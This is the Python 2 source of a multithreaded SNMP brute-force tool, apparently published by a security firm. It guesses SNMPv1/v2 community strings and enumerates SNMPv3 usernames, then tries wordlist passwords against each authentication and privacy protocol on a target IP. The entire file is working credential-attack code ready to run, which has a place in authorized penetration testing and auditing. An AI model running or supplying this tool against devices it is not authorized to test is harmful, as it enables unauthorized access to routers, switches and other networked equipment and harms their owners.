#!/usr/bin/env python2
# Copyright curesec Gmbh ping@curesec.com

import argparse
import Queue
import threading

from pysnmp.entity.rfc3413.oneliner import cmdgen



myQueue = Queue.Queue()
myLock = threading.Lock()

auth_protocols = { "MD5": cmdgen.usmHMACMD5AuthProtocol, "SHA": cmdgen.usmHMACSHAAuthProtocol}
priv_protocols = { "DES": cmdgen.usmDESPrivProtocol, "3DES": cmdgen.usm3DESEDEPrivProtocol,
		"AES128": cmdgen.usmAesCfb128Protocol, "AES192": cmdgen.usmAesCfb192Protocol,
		"AES256": cmdgen.usmAesCfb256Protocol }

successful_auth_protocol = None
successful_priv_protocol = None

successful_logins = []

class SNMP_BRUTE_FORCE(threading.Thread):
        def run(self):
                while True:
			username, auth_password, auth_protocol, priv_password, priv_protocol = myQueue.get()
			self.snmp_brute_force(username, auth_password, auth_protocol, priv_password, priv_protocol)
                        myQueue.task_done()


	def snmp_brute_force(self, username, auth_password, auth_protocol, priv_password, priv_protocol):
		global passwords
		global ip
		global port
		global version
		global timeout
		global retries
		global verbose

		if version == 1 or version == 2:
			# parameter "username" is the community string
			if verbose:
				myLock.acquire()
				print "Testing community string: %s" % username
				myLock.release()
			status = snmp_connect(username, None, None, None, None, ip, port, version, timeout, retries, verbose)
			if status == "ok":
				myLock.acquire()
				print "Success: %s" % username
				myLock.release()
		else: # version 3
			global auth_protocols
			global priv_protocols
			global smartmode
			if smartmode:
				global successful_auth_protocol
				global successful_priv_protocol
			global successful_logins
			if not auth_password:
				# test username without passwords
				status = snmp_connect(username, None, None, None, None, ip, port, version, timeout, retries, verbose)
				if status == "ok":
					myLock.acquire()
					print "Success: %s" % username
					myLock.release()
				elif status == "timeout":
					pass
				elif status == "unknownuser":
					if verbose:
						myLock.acquire()
						print "Invalid user: %s" % username
						myLock.release()
				else:
					# I'm not completely sure if this means for 100% that the username is valid
					# Could there be other error messages which indicate invalid usernames?
					myLock.acquire()
					print "Valid user: %s" % username
					myLock.release()

					# If no password provided, stop here
					if not passwords:
						return

					for auth_password in passwords:
						for auth_protocol in auth_protocols:
							if verbose:
								myLock.acquire()
								print "Testing: %s:%s[%s]" % (username, auth_password, auth_protocol)
								myLock.release()
							myQueue.put((username, auth_password, auth_protocol, None, None))
			elif not priv_password:
				# test username with authentication but no privacy

				if smartmode:
					if successful_auth_protocol and auth_protocol != successful_auth_protocol:
						return

				if username in successful_logins:
					return

				status = snmp_connect(username, auth_password, auth_protocols[auth_protocol], None, None, ip, port, version, timeout, retries, verbose)
				if status == "ok":
					myLock.acquire()
					print "Success: %s:%s[%s]" % (username, auth_password, auth_protocol)
					myLock.release()
					if smartmode:
						successful_auth_protocol = auth_protocol
					successful_logins += [username]
				# timeout and wrongdigest means wrong password
				elif status == "timeout" or status == "wrongdigest":
					pass
				# I don't know if else is better than elif "authorizationError" or "unsupportedSecLevel"
				# else might produce false positives and thus increase run time
				else:
					myLock.acquire()
					print "Valid combination: %s:%s[%s]" % (username, auth_password, auth_protocol)
					myLock.release()
					for priv_password in passwords:
						for priv_protocol in priv_protocols:
							if verbose:
								myLock.acquire()
								print "Testing: %s:%s[%s]:%s[%s]" % (username, auth_password, auth_protocol, priv_password, priv_protocol)
								myLock.release()
							myQueue.put((username, auth_password, auth_protocol, priv_password, priv_protocol))
			else:
				# test username with authentication and privacy

				if smartmode:
					if successful_priv_protocol and priv_protocol != successful_priv_protocol:
						return

				if username in successful_logins:
					return

				status = snmp_connect(username, auth_password, auth_protocols[auth_protocol], priv_password, priv_protocols[priv_protocol], ip, port, version, timeout, retries, verbose)
				if status == "ok":
					myLock.acquire()
					print "Success: %s:%s[%s]:%s[%s]" % (username, auth_password, auth_protocol, priv_password, priv_protocol)
					myLock.release()
					if smartmode:
						successful_priv_protocol = priv_protocol
					successful_logins += [username]




# possible return values:
# "ok"
# "unknownuser"
# "unsupportedseclevel"
# "wrongdigest"
# "timeout"
# "errorunknown"
def snmp_connect(username, auth_password, auth_protocol, priv_password, priv_protocol, ip, port, version, timeout, retries, verbose):
	cmdGen = cmdgen.CommandGenerator()

	if version == 1:
		authentication =  cmdgen.CommunityData(username, mpModel = 0)
	elif version == 2:
		authentication =  cmdgen.CommunityData(username, mpModel = 1)
	else: # version 3:
		if auth_password == None:
			authentication = cmdgen.UsmUserData(username)
		elif priv_password == None:
			authentication = cmdgen.UsmUserData(username, auth_password, authProtocol = auth_protocol)
		else:
			authentication = cmdgen.UsmUserData(username, auth_password, priv_password, authProtocol = auth_protocol, privProtocol = priv_protocol)
			

	errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(
		authentication,
		cmdgen.UdpTransportTarget((ip, port), timeout = timeout, retries = retries),
		cmdgen.MibVariable('SNMPv2-MIB', 'sysDescr', 0)
	)
		
	if errorIndication:
		if verbose:
			print "errorIndication: %s" % errorIndication
		if errorIndication == "unknownUserName":
			return "unknownuser"
		elif errorIndication == "unsupportedSecLevel":
			return "unsupported"
		elif errorIndication == "wrongDigest":
			return "wrongdigest"
		elif "timeout" in str(errorIndication):
			return "timeout"
		else:
			return "errorunknown"
	elif errorStatus:
		if verbose:
			print "errorStatus: %s" % errorStatus
		return "errorunknown"
	else:
		if verbose:
			for name, val in varBinds:
				print('%s = %s' % (name.prettyPrint(), val.prettyPrint()))
		return "ok"






def init(args):
	global ip
	global port
	global version
	global timeout
	global retries
	global verbose
	global smartmode
	ip = args.ip
	port = args.port
	version = args.version
	timeout = args.timeout
	retries = args.retries
	verbose = args.verbose
	smartmode = args.smartmode

	if version != 1 and version != 2 and version != 3:
		print "Error: Version must either be 1, 2 or 3."
		return

	global usernames
	if args.username:
		usernames = [args.username]
	elif args.userfile:
		usernames = []
		userfile = open(args.userfile, "r")
		for username in userfile:
			username = username.strip()
			usernames += [username]
		userfile.close()

	global passwords
	passwords = []
	if version == 1 or version == 2:
		if args.password or args.passwordfile:
			print "Warning: Passwords not required for SNMP v1 and v2"
	if version == 3:
		# picking an improbable username to check whether SNMP agent is alive/responding
		username = "mfxgfwvhxcrqeejolnhjskie"
		if verbose:
			print "Testing improbable username to check whether SMTP agent is alive."
		status = snmp_connect(username, None, None, None, None, ip, port, version, timeout, retries, verbose)
		if status == "timeout":
			print "Error: There appears to be no SNMPv3 server on %s:%s" % (ip, port)
			return
		
		if args.password:
			if len(args.password) < 8:
				print "Error: Password too short: %s" % args.password
				return
			passwords = [args.password]
		elif args.passwordfile:
			passwordfile = open(args.passwordfile, "r")
			for password in passwordfile:
				password = password.strip()
				if len(password) < 8:
					print "Warning: Password too short: %s" % password
				else:
					passwords += [password]
			passwordfile.close()
		if len(passwords) == 0:
			print "Warning: No passwords provided. Thus only brute forcing usernames."

	threads = args.threads

	for i in range(args.threads):
		worker_thread = SNMP_BRUTE_FORCE()
		worker_thread.setDaemon(True)
		worker_thread.start()

	for username in usernames:
		myQueue.put((username, None, None, None, None))

	myQueue.join()







def main():
	parser_description = 	"For SNMP version 1 and 2, username/userfile contains\n" +\
				"the community string(s) to be tested.\n" +\
				"For SNMP version 3, Passwords with a length of less then 8 are ignored.\n" +\
				"For SNMP version 3, usernames can be enumerated without providing passswords.\n" +\
				"Try to pick a low timeout to speed things up.\n" +\
				"There appears to be a bug in pysnmp: For SNMP version 3, picking\n" +\
				"a retries value of either 0 and 1 might result in an infinite loop."
	parser = argparse.ArgumentParser(description = parser_description, formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument("-ip", action="store", dest="ip", required=True, help="e.g. 192.168.0.1")
	parser.add_argument("-port", action="store", dest="port", required=False, type=int, default=161, help="default 161")
	group1 = parser.add_mutually_exclusive_group(required=True)
	group1.add_argument("-username", action="store", dest="username", help="e.g. administrator")
	group1.add_argument("-userfile", action="store", dest="userfile", help="e.g. users.txt")
	group2 = parser.add_mutually_exclusive_group(required=False)
	group2.add_argument("-password", action="store", dest="password", help="e.g. secret")
	group2.add_argument("-passwordfile", action="store", dest="passwordfile", help="e.g. passwords.txt")
	parser.add_argument("-version", action="store", dest="version", type=int, required=True, help="(1 | 2 | 3)")
	parser.add_argument("-timeout", action="store", dest="timeout", type=int, default=3, required=False, help="default 3")
	parser.add_argument("-retries", action="store", dest="retries", type=int, default=2, required=False, help="default 2. Do not use 0 or 1 due to a bug in pysnmp.")
	parser.add_argument("-smartmode", action="store_true", dest="smartmode", default=False, required=False, help="For using SNMPv3. If enabled, then once a successful hashing or encryption algorithm is found, only this one will be used from then on.")
	parser.add_argument("-threads", action="store", dest="threads", type=int, default=1, required=False, help="default 1")
	parser.add_argument("-v", action="store_true", dest="verbose", default=False, required=False)
	args = parser.parse_args()

	init(args)


if __name__ == '__main__':
	main()
